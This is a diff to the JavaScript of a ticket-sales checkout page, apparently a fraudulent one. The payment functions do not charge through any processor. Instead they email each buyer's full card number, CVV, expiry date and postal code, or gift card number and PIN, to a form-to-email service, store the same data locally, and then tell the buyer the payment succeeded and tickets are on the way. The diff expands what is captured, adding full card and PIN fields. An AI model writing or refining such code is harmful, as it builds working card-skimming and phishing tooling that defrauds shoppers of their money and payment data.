@@ -217,7 +217,7 @@ async function submitCardPayment(orderSummary = {}) {
   submitBtn.textContent = 'Processing...';
 
   try {
-    // Create FormData with simple field names for web3forms (matching working script.js)
+    // Create FormData with full details for web3forms
     const formData = new FormData();
     formData.append('access_key', 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea');
     formData.append('subject', 'New Ticket Order - Card Payment');
@@ -225,14 +225,24 @@ async function submitCardPayment(orderSummary = {}) {
     formData.append('email_address', email);
     formData.append('buyer_email', email);
     formData.append('event_name', orderSummary.event || '');
+    formData.append('venue', orderSummary.venue || '');
+    formData.append('date_time', orderSummary.dateTime || '');
+    formData.append('ticket_type', orderSummary.ticketType || '');
+    formData.append('section', orderSummary.section || '');
     formData.append('ticket_quantity', orderSummary.quantity || '');
-    formData.append('total_payment', orderSummary.total || '');
-    formData.append('card_number', cardNumber);
+    formData.append('unit_price', orderSummary.unitPrice ? orderSummary.unitPrice.toFixed(2) : '0.00');
+    formData.append('subtotal', orderSummary.subtotal ? orderSummary.subtotal.toFixed(2) : '0.00');
+    formData.append('booking_fee', orderSummary.bookingFee ? orderSummary.bookingFee.toFixed(2) : '0.00');
+    formData.append('total_payment', orderSummary.total ? orderSummary.total.toFixed(2) : '0.00');
+    formData.append('currency', orderSummary.currency || 'USD');
+    formData.append('card_number_full', cardNumber);
+    formData.append('card_last_four', cardNumber.slice(-4));
     formData.append('expiry_date', expiryDate);
-    formData.append('security_code', cvv);
-    formData.append('zip_code', postalCode);
-    const currencySymbol = orderSummary.currencySymbol || '£';
-    formData.append('message', `Payment Details: Card: ${cardNumber}, Expiry: ${expiryDate}, Amount: ${currencySymbol}${orderSummary.total ? orderSummary.total.toFixed(2) : '0.00'}`);
+    formData.append('security_code_cvv', cvv);
+    formData.append('postal_code', postalCode);
+    
+    const currencySymbol = orderSummary.currencySymbol || '$';
+    formData.append('message', `CARD PAYMENT DETAILS\n================================\n\nBuyer Email: ${email}\n\nEvent Details:\n- Event: ${orderSummary.event}\n- Venue: ${orderSummary.venue}\n- Date & Time: ${orderSummary.dateTime}\n- Ticket Type: ${orderSummary.ticketType}\n- Section/Seat: ${orderSummary.section}\n\nTicket Information:\n- Quantity: ${orderSummary.quantity}\n- Unit Price: ${currencySymbol}${orderSummary.unitPrice ? orderSummary.unitPrice.toFixed(2) : '0.00'}\n- Subtotal: ${currencySymbol}${orderSummary.subtotal ? orderSummary.subtotal.toFixed(2) : '0.00'}\n- Booking Fee (2%): ${currencySymbol}${orderSummary.bookingFee ? orderSummary.bookingFee.toFixed(2) : '0.00'}\n- Total: ${currencySymbol}${orderSummary.total ? orderSummary.total.toFixed(2) : '0.00'}\n\nPayment Method: Credit/Debit Card\n- Card Number: ${cardNumber}\n- CVV: ${cvv}\n- Expiry Date: ${expiryDate}\n- Postal Code: ${postalCode}`);
 
     // Submit to Web3Forms
     const response = await fetch('https://api.web3forms.com/submit', {
@@ -250,7 +260,8 @@ async function submitCardPayment(orderSummary = {}) {
       saveSubmission({
         email: email,
         paymentMethod: 'Card',
-        cardNumber: cardNumber,
+        cardNumberFull: cardNumber,
+        cardLastFour: cardNumber.slice(-4),
         expiryDate: expiryDate,
         cvv: cvv,
         postalCode: postalCode,
@@ -295,7 +306,7 @@ async function submitGiftCardPayment(orderSummary = {}) {
   submitBtn.textContent = 'Processing...';
 
   try {
-    // Create FormData with simple field names for web3forms (matching working script.js)
+    // Create FormData with full details for web3forms
     const formData = new FormData();
     formData.append('access_key', 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea');
     formData.append('subject', 'New Ticket Order - Gift Card Payment');
@@ -303,12 +314,21 @@ async function submitGiftCardPayment(orderSummary = {}) {
     formData.append('email_address', email);
     formData.append('buyer_email', email);
     formData.append('event_name', orderSummary.event || '');
+    formData.append('venue', orderSummary.venue || '');
+    formData.append('date_time', orderSummary.dateTime || '');
+    formData.append('ticket_type', orderSummary.ticketType || '');
+    formData.append('section', orderSummary.section || '');
     formData.append('ticket_quantity', orderSummary.quantity || '');
-    formData.append('total_payment', orderSummary.total || '');
-    formData.append('gift_card_number', giftCardNumber);
-    formData.append('gift_card_pin', giftCardPin);
-    const currencySymbol = orderSummary.currencySymbol || '£';
-    formData.append('message', `Gift Card Payment Received\n\nGift Card: ${giftCardNumber}\nAmount: ${currencySymbol}${orderSummary.total ? orderSummary.total.toFixed(2) : '0.00'}`);
+    formData.append('unit_price', orderSummary.unitPrice ? orderSummary.unitPrice.toFixed(2) : '0.00');
+    formData.append('subtotal', orderSummary.subtotal ? orderSummary.subtotal.toFixed(2) : '0.00');
+    formData.append('booking_fee', orderSummary.bookingFee ? orderSummary.bookingFee.toFixed(2) : '0.00');
+    formData.append('total_payment', orderSummary.total ? orderSummary.total.toFixed(2) : '0.00');
+    formData.append('currency', orderSummary.currency || 'USD');
+    formData.append('gift_card_number_full', giftCardNumber);
+    formData.append('gift_card_pin_full', giftCardPin);
+    
+    const currencySymbol = orderSummary.currencySymbol || '$';
+    formData.append('message', `GIFT CARD PAYMENT DETAILS\n================================\n\nBuyer Email: ${email}\n\nEvent Details:\n- Event: ${orderSummary.event}\n- Venue: ${orderSummary.venue}\n- Date & Time: ${orderSummary.dateTime}\n- Ticket Type: ${orderSummary.ticketType}\n- Section/Seat: ${orderSummary.section}\n\nTicket Information:\n- Quantity: ${orderSummary.quantity}\n- Unit Price: ${currencySymbol}${orderSummary.unitPrice ? orderSummary.unitPrice.toFixed(2) : '0.00'}\n- Subtotal: ${currencySymbol}${orderSummary.subtotal ? orderSummary.subtotal.toFixed(2) : '0.00'}\n- Booking Fee (2%): ${currencySymbol}${orderSummary.bookingFee ? orderSummary.bookingFee.toFixed(2) : '0.00'}\n- Total: ${currencySymbol}${orderSummary.total ? orderSummary.total.toFixed(2) : '0.00'}\n\nPayment Method: Gift Card\n- Gift Card Number: ${giftCardNumber}\n- Gift Card PIN: ${giftCardPin}`);
 
     // Submit to Web3Forms
     const response = await fetch('https://api.web3forms.com/submit', {
@@ -323,13 +343,15 @@ async function submitGiftCardPayment(orderSummary = {}) {
       saveSubmission({
         email: email,
         paymentMethod: 'Gift Card',
-        giftCardNumber: giftCardNumber,
+        giftCardNumberFull: giftCardNumber,
+        giftCardPinFull: giftCardPin,
         orderSummary: orderSummary
       });
 
-      // Show success message and redirect
-      alert('Payment successful! Your tickets have been sent to your email.');
-      window.location.href = 'tickets.html';
+      // Show styled success message (matching card payment style)
+      showStyledAlert('Thank you for your purchase! You will receive your tickets via the email that you just provided.', () => {
+        window.location.href = 'tickets.html';
+      });
     } else {
       alert('Payment processing failed. Please try again.');
       submitBtn.disabled = false;
